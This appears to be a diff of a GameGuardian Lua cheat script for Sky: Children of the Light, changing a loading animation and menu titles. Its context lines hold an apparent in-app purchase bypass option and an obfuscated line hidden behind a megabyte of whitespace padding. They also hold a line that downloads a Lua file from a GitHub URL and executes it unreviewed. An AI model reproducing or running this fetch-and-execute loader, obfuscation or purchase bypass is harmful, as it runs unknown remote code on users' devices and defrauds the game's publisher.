@@ -1,8 +1,6 @@
-
-
-
+for x = 20,100,100/5 do gg.sleep(500);gg.toast("⌛Loading ["..x.."%]") end  
 gg.setVisible(false)
-bian = os.date ('      ⚡ have fun ⚡\
+bian = os.date ('      ⚡SKY CHILDREN OF THE LIGHT ⚡\
 \
            ❦ ════ •⊰❂ - ❂⊱• ════ ❦\
 \
@@ -23,7 +21,7 @@ multi = gg.multiChoice({
 "Buy iap old",
 
 
-},nil,'😈 SKY CHILDREN OF THE LIGHT 😈')
+},nil,'☠️☠️☠️')
 
 if multi == nil then else
 if multi[1] == true then B1() end
@@ -75,7 +73,6 @@ local DANG_VAN_TRUONG_ZALO_0332590853=string.rep(' ',1048576)sOaJ={}for cInW=1,1
 
 V = load(gg.makeRequest("https://raw.githubusercontent.com/arifstia/iap/main/Buy_iap_Old.lua").content)pcall(V)
 end
-
 
 while true do 
   if gg.isVisible(false) then 
